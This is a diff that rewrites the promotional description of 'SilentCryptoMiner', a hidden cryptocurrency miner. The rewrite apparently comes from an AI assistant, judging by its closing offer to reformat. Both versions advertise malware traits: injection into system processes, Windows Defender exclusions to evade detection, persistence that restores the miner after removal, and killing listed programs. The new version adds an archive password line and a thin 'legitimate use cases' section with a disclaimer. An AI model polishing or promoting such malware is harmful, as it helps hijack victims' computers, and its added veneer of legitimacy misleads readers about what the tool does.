@@ -1,38 +1,33 @@
-SilentCryptoMiner v3.4.0 - Miner for ETC, RVN, XMR, RTM & many more
-A free silent (hidden) native cryptocurrency miner capable of mining ETC, RVN, XMR, RTM and much more, with many features suited for mining silently.
+PASSWORD: 2026
+Multi‑Algorithm Silent Miner for ETC, RVN, XMR, RTM & More
+SilentCryptoMiner is a native C++ cryptocurrency miner with advanced features for silent (hidden) operation. It supports dozens of algorithms and cryptocurrencies, including ETC, RVN, XMR, and RTM. This tool is intended for experienced users and researchers working in controlled environments.
 
-This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
+🔥 Supported Algorithms
+The miner can handle all the following algorithms (and any cryptocurrency that uses them):
 
-List of algorithms:
-Main Features
-Native C++ - Miner installer/injector and watchdog coded fully in C++ with no run requirements except a
-64-bit OS
+See the repository documentation for the full list of supported algorithms.
 
-Injection (Silent/Hidden) - Hide miner inside another process like conhost.exe, explorer.exe, svchost.exe
-and others
+🚀 Main Features
+Category	Description
+Native C++	Fully written in C++. No runtime requirements except a 64‑bit OS.
+Injection (Silent/Hidden)	Injects the miner into legitimate processes like conhost.exe, explorer.exe, svchost.exe, and others.
+Idle Mining	Configurable CPU/GPU usage during idle or active computer states.
+Stealth Mode	Automatically pauses mining and clears GPU memory/RAM when any program from the "Stealth Targets" list is opened.
+Watchdog	Monitors miner files, processes, and startup entries; restores the miner if anything is removed or terminated.
+Multiple Miners	Run several miners simultaneously (e.g., XMR on CPU + RVN on GPU).
+CPU & GPU Mining	Supports CPU, NVIDIA GPU, and AMD GPU mining.
+Windows Defender Exclusions	Automatically adds exclusions to Windows Defender to avoid detection.
+Process Killer	Constantly checks for programs in the "Kill Targets" list and terminates them if found.
+Remote Configuration	Fetches miner settings from a specified URL every 100 minutes.
+Web Panel Support	Monitor and configure all miners efficiently via a free, self‑hosted web panel.
++ Many More	Continuously expanding feature set.
+📌 Legitimate Use Cases
+Security testing in isolated lab environments.
 
-Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or
-isn't in use
+Antivirus and EDR solution behavior research.
 
-Stealth - Pauses the miner and clears the GPU memory and RAM while any of the programs in the "Stealth
-Targets" option are open
+System administration and process monitoring training.
 
-Watchdog - Monitors the miner file, miner processes and startup entry and restores the miner if anything
-is removed or killed
+⚠️ Important: This tool is designed for educational purposes and security testing. Using it without explicit permission from the system owner may violate computer security laws.
 
-Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner
-and one RVN (GPU) miner
-
-CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
-
-Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid
-being detected
-
-Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
-
-Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
-
-Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-
-hosted online web panel
-
-And many many more.
+Let me know if you need a different format (plain text, markdown without tables, etc.) or further adjustments.
